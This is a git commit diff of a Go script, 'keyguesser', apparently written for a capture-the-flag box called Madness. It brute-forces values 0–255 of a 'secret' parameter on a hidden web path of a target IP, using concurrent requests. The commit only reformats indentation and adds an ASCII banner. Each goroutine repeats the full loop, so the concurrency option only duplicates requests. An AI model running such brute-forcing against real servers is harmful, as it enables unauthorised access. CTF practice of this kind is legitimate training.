f4f542e29b94aeba689a9887b4a94d494ee49e0d
offensivedroid <138177031+offensivedroid@users.noreply.github.com>
2023-07-11 23:19:00 +0000

    Update keyguesser.go

--- Madness/keyguesser.go
+++ Madness/keyguesser.go
@@ -1,66 +1,77 @@
 package main
 
 import (
-        "fmt"
-        "io/ioutil"
-        "log"
-        "net/http"
-        "os"
-        "strconv"
-        "sync"
+	"fmt"
+	"io/ioutil"
+	"log"
+	"net/http"
+	"os"
+	"strconv"
+	"sync"
 )
 
 type methods interface {
-        guessKey(wg *sync.WaitGroup)
+	guessKey(wg *sync.WaitGroup)
 }
 
 type Guess struct {
-        ip string
+	ip string
 }
 
 func (g *Guess) guessKey(wg *sync.WaitGroup) {
-        defer wg.Done()
-        for i := 0; i <= 255; i++ {
-                resp, err := http.Get("http://" + g.ip + "/th1s_1s_h1dd3n/?secret=" + strconv.Itoa(i))
-                if err != nil {
-                        log.Fatal(err)
-                }
-                defer resp.Body.Close()
-                body, err := ioutil.ReadAll(resp.Body)
-                if err != nil {
-                        log.Fatal(err)
-                }
-                fmt.Println(string(body))
+	defer wg.Done()
+	for i := 0; i <= 255; i++ {
+		resp, err := http.Get("http://" + g.ip + "/th1s_1s_h1dd3n/?secret=" + strconv.Itoa(i))
+		if err != nil {
+			log.Fatal(err)
+		}
+		defer resp.Body.Close()
+		body, err := ioutil.ReadAll(resp.Body)
+		if err != nil {
+			log.Fatal(err)
+		}
+		fmt.Println(string(body))
 
-        }
+	}
 }
 
 func callGuessKey(m methods, concurrency int) {
-        var wg sync.WaitGroup
-        wg.Add(concurrency)
+	var wg sync.WaitGroup
+	wg.Add(concurrency)
 
-        for i := 0; i < concurrency; i++ {
-                go m.guessKey(&wg)
-        }
+	for i := 0; i < concurrency; i++ {
+		go m.guessKey(&wg)
+	}
 
-        wg.Wait()
+	wg.Wait()
 }
 
 func main() {
-        if len(os.Args) < 3 {
-                fmt.Println("Usage: ./keyguesser <ip> <concurrency>")
-                os.Exit(1)
-        }
+	if len(os.Args) < 3 {
+		fmt.Println(`
+  _  __             _____
+ | |/ /            / ____|
+ | ' / ___ _   _  | |  __ _   _  ___  ___ ___  ___ _ __
+ |  < / _ \ | | | | | |_ | | | |/ _ \/ __/ __|/ _ \ '__|
+ | . \  __/ |_| | | |__| | |_| |  __/\__ \__ \  __/ |
+ |_|\_\___|\__, |  \_____|\__,_|\___||___/___/\___|_|
+            __/ |
+           |___/
+                | Made By Droid |
+---------------------------------------------------------  
+Usage: ./guess <ip> <concurrency>`)
+		os.Exit(1)
+	}
 
-        g := &Guess{
-                ip: os.Args[1],
-        }
+	g := &Guess{
+		ip: os.Args[1],
+	}
 
-        concurrency, err := strconv.Atoi(os.Args[2])
-        if err != nil {
-                fmt.Println("Invalid concurrency value")
-                os.Exit(1)
-        }
+	concurrency, err := strconv.Atoi(os.Args[2])
+	if err != nil {
+		fmt.Println("Invalid concurrency value")
+		os.Exit(1)
+	}
 
-        callGuessKey(g, concurrency)
+	callGuessKey(g, concurrency)
 }
